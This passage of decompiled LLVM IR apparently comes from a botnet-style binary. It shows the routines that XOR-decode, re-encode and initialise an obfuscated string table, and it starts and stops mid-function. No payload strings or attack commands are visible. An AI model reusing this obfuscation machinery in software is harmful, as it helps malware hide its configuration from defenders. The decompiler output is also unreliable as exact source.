  uselistorder i32* @global_var_24f94.153, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_224b0.142, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_24f78.59, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_24f78.59 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_24f9c.140, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_104c0, { 1, 0 }
  uselistorder label %dec_label_pc_f71c.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f71c.backedge.thread565, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_f71c.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10474, { 1, 0 }
  uselistorder label %dec_label_pc_103d4, { 1, 0 }
  uselistorder label %dec_label_pc_101c8, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_10190, { 1, 0 }
  uselistorder label %dec_label_pc_1017c, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_1016c, { 1, 0 }
  uselistorder label %dec_label_pc_1005c, { 1, 0 }
  uselistorder label %dec_label_pc_ff90, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_ff78, { 1, 0 }
  uselistorder label %dec_label_pc_fe8c, { 1, 0 }
  uselistorder label %dec_label_pc_fdd0, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_fc88, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fc70, { 1, 0 }
  uselistorder label %dec_label_pc_fbb4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fb9c, { 1, 0 }
  uselistorder label %dec_label_pc_fb28, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread102, { 2, 0, 1 }
  uselistorder label %dec_label_pc_faf4, { 1, 0 }
  uselistorder label %.thread98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fad4, { 1, 0 }
  uselistorder label %dec_label_pc_fac0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_fa7c, { 1, 0 }
  uselistorder label %dec_label_pc_fa7c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_fa10, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f9f8, { 1, 0 }
  uselistorder label %dec_label_pc_f96c, { 6, 7, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_f964, { 4, 2, 5, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_f94c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f828, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb425, { 1, 0 }
  uselistorder label %bb423, { 1, 0 }
  uselistorder label %dec_label_pc_f7f0, { 1, 0 }
  uselistorder label %dec_label_pc_f784, { 1, 0 }
  uselistorder label %.thread81, { 1, 0 }
  uselistorder label %dec_label_pc_f734, { 1, 0 }
  uselistorder label %dec_label_pc_f724, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f724.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_f718.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f700, { 1, 0 }
  uselistorder label %bb419, { 1, 0 }
  uselistorder label %dec_label_pc_f624, { 1, 0 }
  uselistorder label %bb417, { 1, 0 }
  uselistorder label %bb415, { 1, 0 }
  uselistorder label %bb413, { 1, 0 }
  uselistorder label %bb411, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_f518.dec_label_pc_f518_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f4f4.dec_label_pc_f4f4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f4e8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_f4d0, { 1, 0 }
  uselistorder label %dec_label_pc_f4ac, { 1, 0 }
  uselistorder label %dec_label_pc_f35c, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_f348, { 1, 0 }
  uselistorder label %bb408, { 1, 0 }
  uselistorder label %dec_label_pc_f1dc, { 1, 0 }
  uselistorder label %dec_label_pc_f1d0, { 1, 0 }
  uselistorder label %dec_label_pc_f1c4, { 1, 0 }
  uselistorder label %dec_label_pc_f1b8, { 1, 0 }
  uselistorder label %dec_label_pc_f1ac, { 1, 0 }
  uselistorder label %dec_label_pc_f198, { 1, 0 }
  uselistorder label %dec_label_pc_f184, { 1, 0 }
  uselistorder label %dec_label_pc_f170, { 1, 0 }
  uselistorder label %dec_label_pc_f150, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f12c, { 1, 0 }
  uselistorder label %dec_label_pc_f120, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f0fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f0d8, { 1, 0 }
  uselistorder label %bb375, { 1, 0 }
  uselistorder label %dec_label_pc_f084, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_ee84, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24fa4.216 to i32), i32* @r2, align 4
  %v3_104cc = mul i32 %arg1, 8
  %v2_104d0 = add i32 %v3_104cc, ptrtoint (i32* @global_var_24fa4.216 to i32)
  store i32 %v2_104d0, i32* @r3, align 4
  %v2_104d4 = icmp eq i32* %arg2, null
  br i1 %v2_104d4, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_104dc4 = inttoptr i32 %v2_104d0 to i32*
  %v4_104dc5 = load i32, i32* %v3_104dc4, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_104d8 = add i32 %v3_104cc, add (i32 ptrtoint (i32* @global_var_24fa4.216 to i32), i32 4)
  %v3_104d8 = inttoptr i32 %v2_104d8 to i16*
  %v4_104d8 = load i16, i16* %v3_104d8, align 4
  %v5_104d8 = zext i16 %v4_104d8 to i32
  store i32 %v5_104d8, i32* @r3, align 4
  %v3_104dc = inttoptr i32 %v2_104d0 to i32*
  %v4_104dc = load i32, i32* %v3_104dc, align 4
  store i32 %v5_104d8, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_104dc6 = phi i32 [ %v4_104dc5, %.thread ], [ %v4_104dc, %bb ]
  ret i32 %v4_104dc6

; uselistorder directives
  uselistorder i32 %v2_104d0, { 1, 0, 2 }
  uselistorder i32 %v3_104cc, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_104f4 = mul i32 %arg1, 8
  %v2_104f8 = add i32 %v3_104f4, ptrtoint (i32* @global_var_24fa4.216 to i32)
  %v2_104fc = load i32, i32* @global_var_222f4.219, align 4
  store i32 %v2_104fc, i32* @r1, align 4
  %v1_10500 = add i32 %v3_104f4, add (i32 ptrtoint (i32* @global_var_24fa4.216 to i32), i32 4)
  %v2_10500 = inttoptr i32 %v1_10500 to i16*
  %v3_10500 = load i16, i16* %v2_10500, align 4
  %v3_10504 = udiv i32 %v2_104fc, 256
  %v2_10508 = icmp eq i16 %v3_10500, 0
  %v3_1050c = udiv i32 %v2_104fc, 65536
  store i32 %v3_1050c, i32* @r3, align 4
  %v3_10510 = load i32, i32* @r4, align 4
  store i32 %v3_10510, i32* %stack_var_-16, align 4
  %v1_10514 = urem i32 %v3_10504, 256
  store i32 %v1_10514, i32* %r6.global-to-local, align 4
  %v1_10518 = urem i32 %v3_1050c, 256
  store i32 %v1_10518, i32* %r5.global-to-local, align 4
  %v3_1051c = udiv i32 %v2_104fc, 16777216
  store i32 %v3_1051c, i32* %r4.global-to-local, align 4
  %v1_10520 = urem i32 %v2_104fc, 256
  store i32 %v1_10520, i32* %lr.global-to-local, align 4
  br i1 %v2_10508, label %dec_label_pc_1057c, label %dec_label_pc_10528

dec_label_pc_10528:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_1052c = inttoptr i32 %v2_104f8 to i32*
  br label %dec_label_pc_1052c

dec_label_pc_1052c:                               ; preds = %dec_label_pc_1052c.dec_label_pc_1052c_crit_edge, %dec_label_pc_10528
  %v0_10534 = phi i32 [ %v0_10534.pre, %dec_label_pc_1052c.dec_label_pc_1052c_crit_edge ], [ %v1_10520, %dec_label_pc_10528 ]
  %v2_10538 = phi i32 [ %v1_10570, %dec_label_pc_1052c.dec_label_pc_1052c_crit_edge ], [ 0, %dec_label_pc_10528 ]
  %v2_1052c = load i32, i32* %v1_1052c, align 4
  %v2_10530 = add i32 %v2_1052c, %v2_10538
  %v3_10530 = inttoptr i32 %v2_10530 to i8*
  %v4_10530 = load i8, i8* %v3_10530, align 1
  %v6_10530 = zext i8 %v4_10530 to i32
  %v2_10534 = xor i32 %v6_10530, %v0_10534
  %v1_10538 = trunc i32 %v2_10534 to i8
  store i8 %v1_10538, i8* %v3_10530, align 1
  %v2_1053c = load i32, i32* %v1_1052c, align 4
  %v0_10540 = load i32, i32* @ip, align 4
  %v2_10540 = add i32 %v0_10540, %v2_1053c
  %v3_10540 = inttoptr i32 %v2_10540 to i8*
  %v4_10540 = load i8, i8* %v3_10540, align 1
  %v6_10540 = zext i8 %v4_10540 to i32
  %v0_10544 = load i32, i32* %r6.global-to-local, align 4
  %v2_10544 = xor i32 %v0_10544, %v6_10540
  %v1_10548 = trunc i32 %v2_10544 to i8
  store i8 %v1_10548, i8* %v3_10540, align 1
  %v2_1054c = load i32, i32* %v1_1052c, align 4
  %v0_10550 = load i32, i32* @ip, align 4
  %v2_10550 = add i32 %v0_10550, %v2_1054c
  %v3_10550 = inttoptr i32 %v2_10550 to i8*
  %v4_10550 = load i8, i8* %v3_10550, align 1
  %v6_10550 = zext i8 %v4_10550 to i32
  %v0_10554 = load i32, i32* %r5.global-to-local, align 4
  %v2_10554 = xor i32 %v0_10554, %v6_10550
  %v1_10558 = trunc i32 %v2_10554 to i8
  store i8 %v1_10558, i8* %v3_10550, align 1
  %v2_1055c = load i32, i32* %v1_1052c, align 4
  store i32 %v2_1055c, i32* @r1, align 4
  %v0_10560 = load i32, i32* @ip, align 4
  %v2_10560 = add i32 %v0_10560, %v2_1055c
  %v3_10560 = inttoptr i32 %v2_10560 to i8*
  %v4_10560 = load i8, i8* %v3_10560, align 1
  %v6_10560 = zext i8 %v4_10560 to i32
  %v0_10564 = load i32, i32* %r4.global-to-local, align 4
  %v2_10564 = xor i32 %v0_10564, %v6_10560
  store i32 %v2_10564, i32* @r3, align 4
  %v1_10568 = trunc i32 %v2_10564 to i8
  store i8 %v1_10568, i8* %v3_10560, align 1
  %v3_1056c = load i16, i16* %v2_10500, align 4
  %v4_1056c = zext i16 %v3_1056c to i32
  %v0_10570 = load i32, i32* @ip, align 4
  %v1_10570 = add i32 %v0_10570, 1
  store i32 %v1_10570, i32* @ip, align 4
  %v8_10578 = icmp sgt i32 %v4_1056c, %v1_10570
  br i1 %v8_10578, label %dec_label_pc_1052c.dec_label_pc_1052c_crit_edge, label %dec_label_pc_1057c.loopexit

dec_label_pc_1052c.dec_label_pc_1052c_crit_edge:  ; preds = %dec_label_pc_1052c
  %v0_10534.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1052c

dec_label_pc_1057c.loopexit:                      ; preds = %dec_label_pc_1052c
  %v2_1057c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1057c

dec_label_pc_1057c:                               ; preds = %dec_label_pc_1057c.loopexit, %entry
  %v2_1057c = phi i32 [ %v2_1057c.pre, %dec_label_pc_1057c.loopexit ], [ %v3_10510, %entry ]
  store i32 %v2_1057c, i32* @r4, align 4
  ret i32 %v2_104f8

; uselistorder directives
  uselistorder i32 %v1_10570, { 1, 2, 0 }
  uselistorder i32 %v1_10520, { 1, 0 }
  uselistorder i32 %v3_1050c, { 1, 0 }
  uselistorder i32 %v2_104fc, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_104f8, { 1, 0 }
  uselistorder i32 %v3_104f4, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10594 = mul i32 %arg1, 8
  %v2_10598 = add i32 %v3_10594, ptrtoint (i32* @global_var_24fa4.216 to i32)
  %v2_1059c = load i32, i32* @global_var_222f4.219, align 4
  %v1_105a0 = add i32 %v3_10594, add (i32 ptrtoint (i32* @global_var_24fa4.216 to i32), i32 4)
  %v2_105a0 = inttoptr i32 %v1_105a0 to i16*
  %v3_105a0 = load i16, i16* %v2_105a0, align 4
  %v3_105a4 = udiv i32 %v2_1059c, 256
  %v2_105a8 = icmp eq i16 %v3_105a0, 0
  %v3_105ac = udiv i32 %v2_1059c, 65536
  %v3_105b0 = load i32, i32* @r4, align 4
  store i32 %v3_105b0, i32* %stack_var_-16, align 4
  %v1_105b4 = urem i32 %v3_105a4, 256
  store i32 %v1_105b4, i32* %r6.global-to-local, align 4
  %v1_105b8 = urem i32 %v3_105ac, 256
  store i32 %v1_105b8, i32* %r5.global-to-local, align 4
  %v3_105bc = udiv i32 %v2_1059c, 16777216
  store i32 %v3_105bc, i32* %r4.global-to-local, align 4
  %v1_105c0 = urem i32 %v2_1059c, 256
  store i32 %v1_105c0, i32* %lr.global-to-local, align 4
  br i1 %v2_105a8, label %dec_label_pc_1061c, label %dec_label_pc_105c8

dec_label_pc_105c8:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_105cc = inttoptr i32 %v2_10598 to i32*
  br label %dec_label_pc_105cc

dec_label_pc_105cc:                               ; preds = %dec_label_pc_105cc.dec_label_pc_105cc_crit_edge, %dec_label_pc_105c8
  %v0_105d4 = phi i32 [ %v0_105d4.pre, %dec_label_pc_105cc.dec_label_pc_105cc_crit_edge ], [ %v1_105c0, %dec_label_pc_105c8 ]
  %v2_105d8 = phi i32 [ %v1_10610, %dec_label_pc_105cc.dec_label_pc_105cc_crit_edge ], [ 0, %dec_label_pc_105c8 ]
  %v2_105cc = load i32, i32* %v1_105cc, align 4
  %v2_105d0 = add i32 %v2_105cc, %v2_105d8
  %v3_105d0 = inttoptr i32 %v2_105d0 to i8*
  %v4_105d0 = load i8, i8* %v3_105d0, align 1
  %v6_105d0 = zext i8 %v4_105d0 to i32
  %v2_105d4 = xor i32 %v6_105d0, %v0_105d4
  %v1_105d8 = trunc i32 %v2_105d4 to i8
  store i8 %v1_105d8, i8* %v3_105d0, align 1
  %v2_105dc = load i32, i32* %v1_105cc, align 4
  %v0_105e0 = load i32, i32* @ip, align 4
  %v2_105e0 = add i32 %v0_105e0, %v2_105dc
  %v3_105e0 = inttoptr i32 %v2_105e0 to i8*
  %v4_105e0 = load i8, i8* %v3_105e0, align 1
  %v6_105e0 = zext i8 %v4_105e0 to i32
  %v0_105e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_105e4 = xor i32 %v0_105e4, %v6_105e0
  %v1_105e8 = trunc i32 %v2_105e4 to i8
  store i8 %v1_105e8, i8* %v3_105e0, align 1
  %v2_105ec = load i32, i32* %v1_105cc, align 4
  %v0_105f0 = load i32, i32* @ip, align 4
  %v2_105f0 = add i32 %v0_105f0, %v2_105ec
  %v3_105f0 = inttoptr i32 %v2_105f0 to i8*
  %v4_105f0 = load i8, i8* %v3_105f0, align 1
  %v6_105f0 = zext i8 %v4_105f0 to i32
  %v0_105f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_105f4 = xor i32 %v0_105f4, %v6_105f0
  %v1_105f8 = trunc i32 %v2_105f4 to i8
  store i8 %v1_105f8, i8* %v3_105f0, align 1
  %v2_105fc = load i32, i32* %v1_105cc, align 4
  %v0_10600 = load i32, i32* @ip, align 4
  %v2_10600 = add i32 %v0_10600, %v2_105fc
  %v3_10600 = inttoptr i32 %v2_10600 to i8*
  %v4_10600 = load i8, i8* %v3_10600, align 1
  %v6_10600 = zext i8 %v4_10600 to i32
  %v0_10604 = load i32, i32* %r4.global-to-local, align 4
  %v2_10604 = xor i32 %v0_10604, %v6_10600
  %v1_10608 = trunc i32 %v2_10604 to i8
  store i8 %v1_10608, i8* %v3_10600, align 1
  %v3_1060c = load i16, i16* %v2_105a0, align 4
  %v4_1060c = zext i16 %v3_1060c to i32
  %v0_10610 = load i32, i32* @ip, align 4
  %v1_10610 = add i32 %v0_10610, 1
  store i32 %v1_10610, i32* @ip, align 4
  %v8_10618 = icmp sgt i32 %v4_1060c, %v1_10610
  br i1 %v8_10618, label %dec_label_pc_105cc.dec_label_pc_105cc_crit_edge, label %dec_label_pc_1061c.loopexit

dec_label_pc_105cc.dec_label_pc_105cc_crit_edge:  ; preds = %dec_label_pc_105cc
  %v0_105d4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_105cc

dec_label_pc_1061c.loopexit:                      ; preds = %dec_label_pc_105cc
  %v2_1061c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1061c

dec_label_pc_1061c:                               ; preds = %dec_label_pc_1061c.loopexit, %entry
  %v2_1061c = phi i32 [ %v2_1061c.pre, %dec_label_pc_1061c.loopexit ], [ %v3_105b0, %entry ]
  store i32 %v2_1061c, i32* @r4, align 4
  ret i32 %v2_10598

; uselistorder directives
  uselistorder i32 %v1_10610, { 1, 2, 0 }
  uselistorder i32 %v1_105c0, { 1, 0 }
  uselistorder i32 %v2_1059c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10594, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1062c = load i32, i32* @r4, align 4
  %v6_1062c = load i32, i32* @r5, align 4
  %v9_1062c = load i32, i32* @r6, align 4
  %v12_1062c = load i32, i32* @r7, align 4
  %v15_1062c = load i32, i32* @r8, align 4
  %v21_1062c = load i32, i32* @sl, align 4
  %v24_1062c = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_10638 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_24fa4.216 to i32), i32* @r4, align 4
  store i32 2, i32* @r7, align 4
  store i32 %v0_10638, i32* %r5.global-to-local, align 4
  %v3_10650 = call i32 @util_memcpy(i32 %v0_10638, i32 ptrtoint (i32* @global_var_19b70.224 to i32), i32 2)
  store i32 13, i32* @r0, align 4
  store i32 %v0_10638, i32* @global_var_24fac.225, align 4
  %v0_1065c = load i32, i32* @r7, align 4
  %v1_1065c = trunc i32 %v0_1065c to i16
  store i16 %v1_1065c, i16* bitcast (i32* @global_var_24fb0.226 to i16*), align 4
  store i32 13, i32* @r5, align 4
  %v0_10664 = call i32 @malloc()
  store i32 ptrtoint ([17 x i8]* @global_var_19b74.228 to i32), i32* @r8, align 4
  %v0_1066c = load i32, i32* @r5, align 4
  store i32 %v0_10664, i32* @r6, align 4
  %v4_10678 = call i32 @util_memcpy(i32 %v0_10664, i32 ptrtoint ([17 x i8]* @global_var_19b74.228 to i32), i32 %v0_1066c)
  %v0_1067c = load i32, i32* @r5, align 4
  store i32 %v0_1067c, i32* @r0, align 4
  %v0_10680 = load i32, i32* @r6, align 4
  store i32 %v0_10680, i32* @global_var_24fb4.229, align 4
  %v1_10684 = trunc i32 %v0_1067c to i16
  store i16 %v1_10684, i16* bitcast (i32* @global_var_24fb8.230 to i16*), align 4
  %v0_10688 = call i32 @malloc()
  %v0_1068c = load i32, i32* @r8, align 4
  %v0_10690 = load i32, i32* @r5, align 4
  store i32 %v0_10688, i32* @r6, align 4
  %v4_10698 = call i32 @util_memcpy(i32 %v0_10688, i32 %v0_1068c, i32 %v0_10690)
  %v0_1069c = load i32, i32* @r7, align 4
  store i32 %v0_1069c, i32* @r0, align 4
  %v0_106a0 = load i32, i32* @r6, align 4
  store i32 %v0_106a0, i32* @global_var_24fbc.231, align 4
  %v0_106a4 = load i32, i32* @r5, align 4
  %v1_106a4 = trunc i32 %v0_106a4 to i16
  store i16 %v1_106a4, i16* bitcast (i32* @global_var_24fc0.232 to i16*), align 4
  %v0_106a8 = call i32 @malloc()
  %v0_106ac = load i32, i32* @r7, align 4
  store i32 %v0_106a8, i32* @r5, align 4
  %v3_106b8 = call i32 @util_memcpy(i32 %v0_106a8, i32 ptrtoint (i32* @global_var_19b88.234 to i32), i32 %v0_106ac)
  store i32 27, i32* @r0, align 4
  %v0_106c0 = load i32, i32* @r5, align 4
  store i32 %v0_106c0, i32* @global_var_24fc4.235, align 4
  %v0_106c4 = load i32, i32* @r7, align 4
  %v1_106c4 = trunc i32 %v0_106c4 to i16
  store i16 %v1_106c4, i16* bitcast (i32* @global_var_24fc8.236 to i16*), align 4
  %v0_106c8 = call i32 @malloc()
  store i32 %v0_106c8, i32* @r5, align 4
  %v4_106d8 = call i32 @util_memcpy(i32 %v0_106c8, i32 ptrtoint ([28 x i8]* @global_var_19b8c.238 to i32), i32 27)
  store i32 6, i32* @r0, align 4
  %v0_106e4 = load i32, i32* @r5, align 4
  store i32 %v0_106e4, i32* @global_var_24fcc.239, align 4
  store i16 27, i16* bitcast (i32* @global_var_24fd0.240 to i16*), align 4
  %v0_106ec = call i32 @malloc()
  store i32 6, i32* @fp, align 4
  store i32 %v0_106ec, i32* @r5, align 4
  %v4_10700 = call i32 @util_memcpy(i32 %v0_106ec, i32 ptrtoint ([7 x i8]* @global_var_19ba8.242 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r6, align 4
  %v0_1070c = load i32, i32* @r5, align 4
  store i32 %v0_1070c, i32* @global_var_24fd4.243, align 4
  %v0_10710 = load i32, i32* @fp, align 4
  %v1_10710 = trunc i32 %v0_10710 to i16
  store i16 %v1_10710, i16* bitcast (i32* @global_var_24fd8.244 to i16*), align 4
  %v0_10714 = call i32 @malloc()
  %v0_10718 = load i32, i32* @r6, align 4
  store i32 %v0_10714, i32* @r5, align 4
  %v4_10724 = call i32 @util_memcpy(i32 %v0_10714, i32 ptrtoint ([8 x i8]* @global_var_19bb0.246 to i32), i32 %v0_10718)
  %v0_10728 = load i32, i32* @r6, align 4
  store i32 %v0_10728, i32* @r0, align 4
  %v0_1072c = load i32, i32* @r5, align 4
  store i32 %v0_1072c, i32* @global_var_24fdc.247, align 4
  %v1_10730 = trunc i32 %v0_10728 to i16
  store i16 %v1_10730, i16* bitcast (i32* @global_var_24fe0.248 to i16*), align 4
  %v0_10734 = call i32 @malloc()
  %v0_10738 = load i32, i32* @r6, align 4
  store i32 %v0_10734, i32* @r5, align 4
  %v4_10744 = call i32 @util_memcpy(i32 %v0_10734, i32 ptrtoint ([8 x i8]* @global_var_19bb8.250 to i32), i32 %v0_10738)
  store i32 3, i32* @r0, align 4
  %v0_1074c = load i32, i32* @r5, align 4
  store i32 %v0_1074c, i32* @global_var_24fe4.251, align 4
  %v0_10750 = load i32, i32* @r6, align 4
  %v1_10750 = trunc i32 %v0_10750 to i16
  store i16 %v1_10750, i16* bitcast (i32* @global_var_24fe8.252 to i16*), align 4
  %v0_10754 = call i32 @malloc()
  store i32 %v0_10754, i32* @r5, align 4
  %v4_10764 = call i32 @util_memcpy(i32 %v0_10754, i32 ptrtoint ([4 x i8]* @global_var_19bc0.254 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_24ff0.255 to i16*), align 4
  %v0_10774 = load i32, i32* @r5, align 4
  store i32 %v0_10774, i32* @global_var_24fec.256, align 4
  %v0_10778 = call i32 @malloc()
  store i32 19, i32* @sl, align 4
  store i32 %v0_10778, i32* @r5, align 4
  %v3_1078c = call i32 @util_memcpy(i32 %v0_10778, i32 ptrtoint (i32* @global_var_19bc4.258 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  %v0_10794 = load i32, i32* @r5, align 4
  store i32 %v0_10794, i32* @global_var_24ff4.259, align 4
  %v0_10798 = load i32, i32* @sl, align 4
  %v1_10798 = trunc i32 %v0_10798 to i16
  store i16 %v1_10798, i16* bitcast (i32* @global_var_24ff8.260 to i16*), align 4
  %v0_1079c = call i32 @malloc()
  store i32 %v0_1079c, i32* @r5, align 4
  %v3_107ac = call i32 @util_memcpy(i32 %v0_1079c, i32 ptrtoint (i32* @global_var_19bd8.262 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  %v0_107b8 = load i32, i32* @r5, align 4
  store i32 %v0_107b8, i32* @global_var_24ffc.263, align 4
  store i16 24, i16* bitcast (i32* @global_var_25000.264 to i16*), align 4
  %v0_107c0 = call i32 @malloc()
  store i32 %v0_107c0, i32* @r5, align 4
  %v4_107d0 = call i32 @util_memcpy(i32 %v0_107c0, i32 ptrtoint ([10 x i8]* @global_var_19bf4.266 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_25008.267 to i16*), align 4
  %v0_107e0 = load i32, i32* @r5, align 4
  store i32 %v0_107e0, i32* @global_var_25004.268, align 4
  %v0_107e4 = call i32 @malloc()
  store i32 16, i32* @sb, align 4
  store i32 %v0_107e4, i32* @r5, align 4
  %v4_107f8 = call i32 @util_memcpy(i32 %v0_107e4, i32 ptrtoint ([17 x i8]* @global_var_19c00.270 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_10800 = load i32, i32* @r5, align 4
  store i32 %v0_10800, i32* @global_var_2500c.271, align 4
  %v0_10804 = load i32, i32* @sb, align 4
  %v1_10804 = trunc i32 %v0_10804 to i16
  store i16 %v1_10804, i16* bitcast (i32* @global_var_25010.272 to i16*), align 4
  %v0_10808 = call i32 @malloc()
  store i32 %v0_10808, i32* @r5, align 4
  %v4_10818 = call i32 @util_memcpy(i32 %v0_10808, i32 ptrtoint ([23 x i8]* @global_var_19c14.274 to i32), i32 22)
  %v0_10820 = load i32, i32* @r6, align 4
  store i32 %v0_10820, i32* @r0, align 4
  %v0_10824 = load i32, i32* @r5, align 4
  store i32 %v0_10824, i32* @global_var_25014.275, align 4
  store i16 22, i16* bitcast (i32* @global_var_25018.276 to i16*), align 4
  %v0_1082c = call i32 @malloc()
  %v0_10830 = load i32, i32* @r6, align 4
  store i32 %v0_1082c, i32* @r5, align 4
  %v4_1083c = call i32 @util_memcpy(i32 %v0_1082c, i32 ptrtoint ([8 x i8]* @global_var_19c2c.278 to i32), i32 %v0_10830)
  store i32 5, i32* @r0, align 4
  %v0_10844 = load i32, i32* @r5, align 4
  store i32 %v0_10844, i32* @global_var_2501c.279, align 4
  %v0_10848 = load i32, i32* @r6, align 4
  %v1_10848 = trunc i32 %v0_10848 to i16
  store i16 %v1_10848, i16* bitcast (i32* @global_var_25020.280 to i16*), align 4
  %v0_1084c = call i32 @malloc()
  store i32 %v0_1084c, i32* @r5, align 4
  %v4_1085c = call i32 @util_memcpy(i32 %v0_1084c, i32 ptrtoint ([6 x i8]* @global_var_19c34.282 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  store i16 5, i16* bitcast (i32* @global_var_25028.283 to i16*), align 4
  %v0_1086c = load i32, i32* @r5, align 4
  store i32 %v0_1086c, i32* @global_var_25024.284, align 4
  %v0_10870 = call i32 @malloc()
  store i32 %v0_10870, i32* @r5, align 4
  %v4_10880 = call i32 @util_memcpy(i32 %v0_10870, i32 ptrtoint ([5 x i8]* @global_var_19c3c.286 to i32), i32 4)
  %v0_10888 = load i32, i32* @fp, align 4
  store i32 %v0_10888, i32* @r0, align 4
  %v0_1088c = load i32, i32* @r5, align 4
  store i32 %v0_1088c, i32* @global_var_2502c.287, align 4
  store i16 4, i16* bitcast (i32* @global_var_25030.288 to i16*), align 4
  %v0_10894 = call i32 @malloc()
  %v0_1089c = load i32, i32* @fp, align 4
  store i32 %v0_10894, i32* @r5, align 4
  %v4_108a4 = call i32 @util_memcpy(i32 %v0_10894, i32 ptrtoint ([7 x i8]* @global_var_19c44.290 to i32), i32 %v0_1089c)
  store i32 14, i32* @r0, align 4
  %v0_108ac = load i32, i32* @r5, align 4
  store i32 %v0_108ac, i32* @global_var_25034.291, align 4
  %v0_108b0 = load i32, i32* @fp, align 4
  %v1_108b0 = trunc i32 %v0_108b0 to i16
  store i16 %v1_108b0, i16* bitcast (i32* @global_var_25038.292 to i16*), align 4
  %v0_108b4 = call i32 @malloc()
  %v0_108c0 = load i32, i32* @r7, align 4
  %v1_108c0 = add i32 %v0_108c0, 12
  store i32 %v1_108c0, i32* @r7, align 4
  store i32 %v0_108b4, i32* @r5, align 4
